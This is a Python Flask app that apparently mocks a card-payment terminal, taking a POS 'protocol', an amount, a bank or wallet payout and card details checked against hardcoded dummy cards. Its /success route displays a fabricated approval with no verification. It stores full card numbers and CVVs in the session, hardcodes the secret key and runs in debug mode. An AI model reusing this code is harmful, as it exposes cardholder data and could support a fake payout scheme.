from flask import Flask, render_template, request, redirect, session, url_for
import random

app = Flask(__name__)
app.secret_key = 'fds_secret_key_8583'

# Simulated dummy card database
DUMMY_CARDS = {
    "5423574876489468": {"expiry": "0926", "cvv": "423", "auth": "4517"},
    "4123574876489468": {"expiry": "1026", "cvv": "963", "auth": "987654"}
}

# Protocols define expected approval code length
PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 6,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

REJECTION_CODES = ["REJ001", "REJ002", "REJ003", "REJ004"]

# ------------------------------
#  ROUTES
# ------------------------------

@app.route('/')
def home():
    session.clear()
    return redirect(url_for('protocol'))

@app.route('/protocol', methods=['GET', 'POST'])
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            return redirect(url_for('rejected', code="INVALID-PROTOCOL"))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
def amount():
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
def payout():
    if request.method == 'POST':
        payout_type = request.form['method']
        session['payout_type'] = payout_type
        if payout_type == 'BANK':
            session['bank'] = request.form['bank']
            session['account'] = request.form['account']
        else:
            session['wallet'] = request.form['wallet']
        return redirect(url_for('card'))
    return render_template('payout.html')

@app.route('/card', methods=['GET', 'POST'])
def card():
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "")
        exp = request.form['expiry'].replace("/", "")
        cvv = request.form['cvv']
        session['pan'] = pan
        session['exp'] = exp
        session['cvv'] = cvv
        session['tries'] = 0

        if pan in DUMMY_CARDS:
            card = DUMMY_CARDS[pan]
            if exp != card['expiry']:
                return redirect(url_for('rejected', code='REJ001'))
            if cvv != card['cvv']:
                return redirect(url_for('rejected', code='REJ002'))
            return redirect(url_for('auth'))
        else:
            return redirect(url_for('rejected', code=random.choice(REJECTION_CODES)))
    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
def auth():
    pan = session.get('pan')
    card = DUMMY_CARDS.get(pan)
    session['tries'] = session.get('tries', 0)

    if request.method == 'POST':
        code = request.form.get('auth')
        session['tries'] += 1

        expected_length = session.get('code_length', 6)

        if len(code) != expected_length:
            return render_template('auth.html', warning=f"Code must be {expected_length} digits.")

        if card and card.get('auth') == code:
            txn_id = random.randint(100000, 999999)
            last4 = pan[-4:] if pan else "XXXX"
            return render_template('success.html', txn_id=txn_id, pan=last4)

        elif session['tries'] >= 3:
            session.clear()
            return redirect(url_for('rejected', code="TXN-DENIED-781: AUTH LIMIT"))

        else:
            remaining = 3 - session['tries']
            return render_template('auth.html', warning=f"Wrong code. {remaining} tries left.")

    return render_template('auth.html')

@app.route('/rejected')
def rejected():
    code = request.args.get('code')
    return render_template('rejected.html', code=code)

# Optional success redirect handler
@app.route('/success')
def success():
    txn_id = random.randint(100000, 999999)
    pan = session.get("pan", "")
    return render_template('success.html', txn_id=txn_id, pan=pan[-4:] if pan else "XXXX")

# ------------------------------
# Run in debug for local use
# ------------------------------
if __name__ == '__main__':
    app.run(debug=True)

